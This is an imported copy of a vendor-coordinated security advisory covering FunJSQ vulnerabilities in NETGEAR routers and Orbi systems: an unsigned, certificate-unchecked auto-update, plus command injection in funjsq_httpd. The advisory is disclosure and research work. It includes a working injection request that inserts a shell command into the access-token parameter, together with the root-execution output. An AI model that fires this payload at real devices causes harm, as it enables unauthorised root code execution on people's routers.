---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-14_security-advisory-netgear-routers-funjsq-vulnerabilities.md
original_filename: 2022-09-14_security-advisory-netgear-routers-funjsq-vulnerabilities.md
title: 'Security Advisory: NETGEAR Routers FunJSQ Vulnerabilities'
category: documents
detected_topics:
- command-injection
- supply-chain
- mobile-security
- access-control
- otp
- automation-abuse
tags:
- imported
- documents
- command-injection
- supply-chain
- mobile-security
- access-control
- otp
- automation-abuse
language: en
raw_sha256: fa430aa436ad72326bc1aa8f6791547e058b37bc44e9d385f80c45fffeef22ef
text_sha256: 1ad5a0c562d70c3cd3eecfb3f98dc9aa63a01191434c92e9b6d79add17b70bc9
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: true
---

# Security Advisory: NETGEAR Routers FunJSQ Vulnerabilities

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-14_security-advisory-netgear-routers-funjsq-vulnerabilities.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain, mobile-security, access-control, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: True
- Raw SHA256: `fa430aa436ad72326bc1aa8f6791547e058b37bc44e9d385f80c45fffeef22ef`
- Text SHA256: `1ad5a0c562d70c3cd3eecfb3f98dc9aa63a01191434c92e9b6d79add17b70bc9`


## Content

---
title: "Security Advisory: NETGEAR Routers FunJSQ Vulnerabilities"
page_title: "Security Advisory: NETGEAR Routers FunJSQ Vulnerabilities | ONEKEY Research | Research | ONEKEY"
url: "https://onekey.com/blog/security-advisory-netgear-routers-funjsq-vulnerabilities/"
final_url: "https://www.onekey.com/resource/security-advisory-netgear-routers-funjsq-vulnerabilities"
authors: ["Quentin Kaiser (@QKaiser)", "Mücahid Kır (@muc0ze)"]
programs: ["Netgear"]
bugs: ["OS command injection", "RCE", "MiTM"]
publication_date: "2022-09-14"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2166
---

[Resources](/resources)

>

[Research](/resources/research)

>

Security Advisory: NETGEAR Routers FunJSQ Vulnerabilities

# Security Advisory: NETGEAR Routers FunJSQ Vulnerabilities

![Security Advisory: NETGEAR Routers FunJSQ Vulnerabilities](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/671b822e403bdc2f3221d575_6712ae1b7f657cc8b66be3ee_02.jpeg)

![](https://cdn.prod.website-files.com/plugins/Basic/assets/placeholder.60f9b1840c.svg)

September 14, 2022

9

min read

TablE of contents

Example H2

## READY TO UPGRADE YOUR RISK MANAGEMENT?

Make cybersecurity and compliance efficient and effective with ONEKEY.

[See it in Action](/book-a-demo)

When working on improving our component detection capabilities to provide more exhaustive automated Software Bill of Materials (SBOM) for IoT devices, we sometimes find ourselves facing "weird" third-party software components. Back in May 2022, we discovered **FunJSQ** , a third-party gaming speed-improvement service by China-based Xiamen Xunwang Network Technology Co., Ltd., present in the majority of NETGEAR firmware images in our corpus.

The plot thickened as we dug more into it and we ended up performing full-on vulnerability research against it. We identified multiple issues affecting this third-party component that could lead to arbitrary code execution from LAN and WAN interfaces. These issues are now fixed, and details are provided below.

**Affected vendor & product**| NETGEAR Routers  
Orbi WiFi Systems  
---|---  
**Vendor Advisory**| [Securit](https://kb.netgear.com/000065132/Security-Advisory-for-Vulnerabilities-in-FunJSQ-on-Some-Routers-and-Orbi-WiFi-Systems-PSV-2022-0117)[y Advisory for Vulnerabilities in FunJSQ on Some Routers and Orbi WiFi Systems, PSV-2022-0117 | Answer | NETGEAR Support](https://kb.netgear.com/000065132/Security-Advisory-for-Vulnerabilities-in-FunJSQ-on-Some-Routers-and-Orbi-WiFi-Systems-PSV-2022-0117)  
**Vulnerable version**|  NETGEAR Routers:  
R6230 version < 1.1.0.112  
R6260 version < 1.1.0.88  
R7000 version < 1.0.11.134  
R8900 version < 1.0.5.42  
R9000 version < 1.0.5.42  
XR300 version < 1.0.3.72  
Orbi WiFi Systems:  
RBR20, RBS20 version < 2.7.2.26  
RBR50, RBS50 version < 2.7.4.26  
**Fixed version**|  NETGEAR Routers:  
R6230 version 1.1.0.112  
R6260 version 1.1.0.88  
R7000 version 1.0.11.134  
R8900 version 1.0.5.42  
R9000 version 1.0.5.42  
XR300 version 1.0.3.72  
Orbi WiFi Systems:  
RBR20, RBS20 version 2.7.2.26  
RBR50, RBS50 version 2.7.4.26  
**CVE IDs**|  CVE-2022-40620 - insecure update mechanism  
CVE-2022-40619 - unauthenticated command injection  
**Impact**|  7.7 (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L)  
**Credit**|  Q. Kaiser, ONEKEY Research Lab  
M. Kir, ONEKEY Research Lab  
Research supported by Certainity  
  
## Introduction

This component was initially reported by a colleague using our ticketing system as a "Chinese gaming speed-improvement service, seen in NETGEAR devices so far, but their binaries may be bundled by other vendors".

From a quick search in our firmware corpus, we discovered its presence in NETGEAR devices (R9000, R7800, RAX200, RAX120, R6230, R6260, RAX40) and some Orbi WiFi Systems (RBR20, RBS20, RBR50, RBS50). Initially, it was unclear why NETGEAR would use such a third-party component and unclear when it’s actually used. From testimony online, it seemed to only be enabled when QoS is enabled on NETGEAR routers.

We did not find CVEs linked to this component, and the only security related issues we discovered mentioning FunJSQ were these two:

  * a private key leaked by NETGEAR linked to their hostname - [NETGEAR TLS Private Key Disclosure through Device Firmware Images](https://gist.github.com/nstarke/a611a19aab433555e91c656fe1f030a9)
  * a vulnerability in NETGEAR’s httpd links to FunJSQ (it’s a form to submit a FunJSQ token) - [CVE-2020-27867 NETGEAR 路由器 RCE 漏洞复现及简要分析](http://www.wangqingzheng.com/anquanke/41/259241.html)

We dug further and discovered an online presence with a description of what FunJSQ actually is:
  
  
  Fanyou Accelerator focuses on game online acceleration services, effectively optimizing the type of network NAT, low latency, fast matching, and no disconnection. Support PS4, NS, Xbox, Windows, Android, iOS six platform acceleration, automatic node selection, automatic acceleration when booting, no computer operation required, public account switch acceleration, smart and convenient.
  
  Supported platforms: PS4, NS, Xbox, Windows, Android, iOS;
  
  Accelerated nodes: Japan, Hong Kong, the United States, South Korea, Europe and other nodes;
  
  Acceleration effect: support NAT promotion, reduce delay, stable without packet loss;

Source: <https://wxapi.funjsq.com/wxMini/app_market/router_gui/funjsq_introduce.php>

## NETGEAR & China

In order to understand the working structure of this service, we first examined the init scripts on the R9000 firmware that we extracted with [unblob](https://b1eyc.myrdbx.io/blog/unblob/).

In **`/etc/init.d/net-lan`** , the device checks the region and only starts the funjsq script if it’s in China. Yes, NETGEAR does not follow ISO standard here. “PR” is not “Puerto Rico”, but probably “People’s Republic”.
  
  
  start_stage0() # $1: boot/start
  {
  --snip--
  region="$(/sbin/artmtd -r region | grep REGION | awk '{print $2}')"
  if [ "$region" = "PR" ];then
  [ "$1" = "boot" ] && /data/funjsq/bin/funjsq.sh init &
  fi
  
  start_dhcpd
  --snip--
  }

For R7000 router, it gets even weirder. It probably was the same situation, but they are now shipping two different firmware revisions, one for each market:

  * Firmware Version 1.0.11.134
  * Firmware Version 1.0.11.208 (China Only)

![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/671b8b8af920cc057143594d_image.png)

Our assumption is that it got initially introduced in 2019 (see [R9000 Firmware Version 1.0.5.2](https://kb.netgear.com/000061341/R9000-Firmware-Version-1-0-5-2)) and then, at some point, they decided to remove or block this third-party component in builds for non-Chinese markets. In terms of internal processes, it's interesting to note that this strategy was not applied consistently across various models. For some models they inserted a check based on the region stored in NVRAM, for others they simply released two different versions, one per region.

The reason why they decided to make the move is unknown to us. Could be due to regulatory requirements, contractual agreements with FunJSQ, or even to achieve attack surface reduction. We can only speculate.

## FunJSQ Architecture

The module is packaged with two directories (config and bin), config holds plaintext files for different services, bin holds ELF files and a shell script (`funjsq.sh`).

On boot, `funjsq.sh` is called from `acos_service` (binary responsible of service launch in NETGEAR kit). It then starts different services related to FunJSQ such as a Redis server (`funjsq_redis`), HTTP server (`funjsq_httpd`), a network sniffer (`funjsq_detect`), and some controller endpoint listening on Unix sockets (`funjsq_daemon`):

![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/671b8b8af920cc057143594a_funjsq_boot.drawio-1-2.png)

Given that `funjsq_redis` is an unmodified fork of Redis server, we chose to focus on two components: the auto-update mechanism in `funjsq.sh` and the HTTP endpoints exposed by `funjsq_httpd` on port TCP/12300.

## MitM to RCE in auto-update process

The core of this issue was reported by our analysis engine when we scanned a R7000 firmware image. As you can see below, calls to curls with certificate validation disabled (`-k`) are made throughout the `funjsq.sh` script: 

![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/671b8b8af920cc0571435969_image-3-1024x571.png)

On boot, a call to `/tmp/funjsq/bin/funjsq.sh init` is performed by `acos_service`. This in turn executes the following bash script:
  
  
  init_funjsq(){
  
  start_update_app &
  funjsq_login=`nvram get funjsq_no_need_login `
  
  mkdir -p /tmp/funjsq/config/redis
  
  killall funjsq_redis funjsq_inetd funjsq_httpd 
  /tmp/funjsq/bin/funjsq_redis -d /tmp/funjsq/config/redis
  /tmp/funjsq/bin/funjsq_inetd
  
  [ "x$funjsq_login" != "x1" ]  && {
  killall funjsq_detect 
  rm -rf /tmp/funjsq/config/values/*
  /tmp/funjsq/bin/funjsq_detect -i br0 -d
  }
  
  
  /tmp/funjsq/bin/funjsq_ctl init & 
  nvram  commit &
  }

As we can see on line 3, an auto-update function is called by launching `start_update_app &`, which is a bash function. This function takes care of auto-updating the FunJSQ package at regular intervals (every 15 minutes). We do not reproduce the whole function for brevity, but the important part is this:
  
  
  curl  -s -k "$d_version_url" -o "${tmp_binary_path}" >/dev/null 2>&1 

We captured traffic to see what was going on and link it to the script behavior.

The script calls `update.funjsq.com`, asking for information regarding the latest FunJSQ plugin for NETGEAR R7000:
  
  
  GET /api/v1/plugin/version_update?system=netgear&type=r7000 HTTP/2
  Host: update.funjsq.com
  User-Agent: curl/7.36.0
  Accept: text/plain

The server answers with a plaintext response:
  
  
  HTTP/2 200 OK
  Server: Tengine
  Content-Type: text/html; charset=UTF-8
  Date: Sat, 07 May 2022 14:37:13 GMT
  X-Powered-By: PHP/7.2.13
  Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, AccessToken, SID
  Access-Control-Allow-Origin: *
  Access-Control-Allow-Methods: POST, GET, OPTIONS
  Access-Control-Max-Age: 3600
  Access-Control-Expose-Headers: SID
  Via: cache30.l2st4-5[32,0], cache7.cn3957[56,0]
  Timing-Allow-Origin: *
  Eagleid: 7ae1d01b16519342337981447e
  
  2.4.8#32ed84eee78106ae2129e9a702db218a#1

The text line follows this format: `version#package_md5#should_update`.

The script performs some comparison to check if the returned version is higher than its local version. If that’s the case, the update process starts, which is simply fetching a `tar.gz` archive from another FunJSQ server:
  
  
  GET /web_control/wxapp/netgear/funjsq_plugin_netgear_r7000.tar.gz HTTP/1.1
  User-Agent: curl/7.36.0
  Host: static.funjsq.com
  Accept: */*

When the package is downloaded, the MD5 sum of the file is compared to the fingerprint received from `update.funjsq.com`. If there is a match, the following command is called:

`tar -zxvf $tmp_binary_path -C / > /dev/null`

So we have the following issues:

  * **insecure communications** due to explicit disabling of certificate validation (`-k`), which allows us to tamper with data returned from the server
  * update packages are simply validated via a hash checksum, **packages are not signed** in any way
  * **arbitrary extraction to the root path with elevated privileges** , allowing whoever controls the update package to overwrite anything anywhere on the device (which puts a lot of trust in a third party supplier)

All of these combined can lead to **arbitrary code execution** from the WAN interface.

## Arbitrary Command Injection in `funjsq_httpd`

We identified the following endpoints being exposed by `funjsq_httpd`:

  * `apply_run.cgi`
  * `apply_save.cgi`
  * `apply_bind.cgi`
  * `upload.cgi`
  * `update.cgi`
  * `upgrade.cgi`
  * `syslog.cgi`
  * `change_lang.cgi`

We looked into **`apply_bind.cgi`** , which accepts the following `action_mode `parameters: **`funjsq_bind`** , **`funjsq_bind_password`** , **`funjsq_scan`** , **`funjsq_unbind`**.

With the exception of `funjsq_scan`, all of these requests require an authentication token provided through a `**funjsq_access_token** `parameter. This token is generated using a weak algorithm, we won't cover it, using a hardcoded string and the device MAC address. This token is then sent to a remote FunJSQ service for validation using curl. If everything goes right, a "`1`" is written to a file named `_funjsq_no_need_login_ `and the client is now considered "bound" and authenticated.

Such a request would simply look like this:
  
  
  curl -ki -X GET https://192.168.100.2:12300/apply_bind.cgi\?action_mode=funjsq_bind\&funjsq_access_token=***REDACTED-SUSPECT-TOKEN***We found that the curl command line is built using the `funjsq_access_token `parameter value, which is user controlled and unsanitized prior to creating the full command line.

![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/671b8b8af920cc0571435951_image-2.png)
  
  
  curl -s -H 'Host:wxapi.funjsq.com' -d 'm=X:X:X:X:X:X' -d 't=e594ff4c36742acf006cdf16b46c5731' https://122.225.208.230/wxMini/v2/cm/ck -k -m 10

This means that we can inject an arbitrary command like this:
  
  
  curl -ki -X GET "https://192.168.100.2:12300/apply_bind.cgi?action_mode=funjsq_bind&funjsq_access_token=e594ff4c36742acf006cdf16'|id>a|'"

When doing so, we would observe the following debug log:
  
  
  [2022-05-18 08:35:48] [INFO] apply.c/check_t/494 cmd=curl -s -H 'Host:wxapi.funjsq.com' -d 'm=X:X:X:X:X:X' -d 't=e594ff4c36742acf006cdf16'|id>a|'' https://122.225.208.229/wxMini/v2/cm/ck -k -m 10  
  sh: : Permission denied  
  curl: no URL specified!  
  curl: try 'curl --help' for more information

And of course, proof of execution as root: 
  
  
  # cat a
  
  uid=0 gid=0(root)

## Key Takeaways

Our constant effort at finding and documenting new components to make our SBOM generator as exhaustive as possible sometimes causes us to discover undocumented and vulnerable software components in widely deployed embedded devices. This instance again sheds light on the complex supply-chain intertanglements in embedded devices and highlights the necessity to assure that all included third-party vendors adhere to at least the same cyber security standards. Otherwise, a critical vulnerability, introduced by a supplier on the other side of the globe, will void one's cyber-security efforts and leave the devices of potentially hundreds of thousands users open to attacks.

## Timeline

**2022-05-19** \- Sent coordinated disclosure request to security@netgear.com, psirt@netgear.com, cert@netgear.com, csirt@netgear.com

**2022-06-10** \- NETGEAR Security got back to us, indicating the right address is security@netgear.com and providing us with their PGP key.

**2022-06-10** \- We provide all vulnerability details to NETGEAR through PGP encrypted emails.

**2022-06-11** \- NETGEAR asks for 120 days grace period, but we instead suggested 90 days as stated in our [responsible disclosure policy](https://b1eyc.myrdbx.io/resposible-disclosure-policy/).

**2022-06-15** \- Both parties agree on September 10th 2022 for fix and disclosure.

**2022-09-08** – NETGEAR release its advisory

**2022-09-12** \- ONEKEY release its advisory

Share

## About Onekey

[ONEKEY](/) is the leading European specialist in Product Cybersecurity & Compliance Management and part of the investment portfolio of [PricewaterhouseCoopers Germany (PwC)](https://www.pwc.de/de.html). The unique combination of the automated ONEKEY Product Cybersecurity & Compliance Platform (OCP) with expert knowledge and consulting services provides fast and comprehensive analysis, support, and management to improve product cybersecurity and compliance from product purchasing, design, development, production to end-of-life.

![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0cd/68d39e055d1135bee5f4ee28_foto_website_careers.webp)

CONTACT:  
Sara Fortmann  
Senior Marketing Manager  
[sara.fortmann@onekey.com](mailto:sara.fortmann@onekey.com)

euromarcom public relations GmbH  
[team@euromarcom.de](mailto:team@euromarcom.de)

## RELATED RESEARCH ARTICLES

![Latest Developments in Unblob: New Formats, Smarter Extraction, and a More Hardened Release Pipeline](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/69c51b643603964355fec609_2026-03-26-ONEKEY-Unblob-Dev.-Update_Banner.png)

Research

Mar 26, 2026

10

min read

### Latest Developments in Unblob: New Formats, Smarter Extraction, and a More Hardened Release Pipeline

Discover what changed in unblob since release 25.11.25, including new firmware and filesystem format support, smarter extraction workflows, robustness fixes, performance improvements, and stronger release security.

[Read More![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0cd/67ee4d7596311684a7a1a95a_xynrqysiccm914h50n.svg)](/resource/latest-developments-in-unblob-new-formats-smarter-extraction-and-a-more-hardened-release-pipeline)

[](/resource/latest-developments-in-unblob-new-formats-smarter-extraction-and-a-more-hardened-release-pipeline)

![How We Taught Our Platform to Understand RTOS Firmware](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/68d14bca3bf9570f12d3d2ab_HERO-RTOS-research-ONEKEY.jpg)

Research

Sep 22, 2025

15

min read

### How We Taught Our Platform to Understand RTOS Firmware

Discover how ONEKEY’s platform breaks open real-time operating system (RTOS) firmware. Learn how automated architecture detection, load address recovery, and component identification bring transparency and security to embedded devices in automotive, medical, and industrial sectors.

[Read More![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0cd/67ee4d7596311684a7a1a95a_xynrqysiccm914h50n.svg)](/resource/how-we-taught-our-platform-to-understand-rtos-firmware)

[](/resource/how-we-taught-our-platform-to-understand-rtos-firmware)

![Security Advisory: Remote Code Execution on Diviotec IP Camera \(CVE-2025-5113\)](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/683d4ad4919020daef44c5cf_Remote-Code-Execution-on-Diviotec-IP-Camera.jpg)

Research

Jun 3, 2025

10

min read

### Security Advisory: Remote Code Execution on Diviotec IP Camera (CVE-2025-5113)

Explore ONEKEY Research Lab's security advisory detailing a critical vulnerability in Diviotec IP Cameras. Learn about the risks and recommended actions.

[Read More![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0cd/67ee4d7596311684a7a1a95a_xynrqysiccm914h50n.svg)](/resource/security-advisory-remote-code-execution-on-diviotec-ip-camera-cve-2025-5113)

[](/resource/security-advisory-remote-code-execution-on-diviotec-ip-camera-cve-2025-5113)

## Ready to automate your Product Cybersecurity & Compliance?

Make cybersecurity and compliance efficient and effective with ONEKEY.

[See it in Action](/book-a-demo)
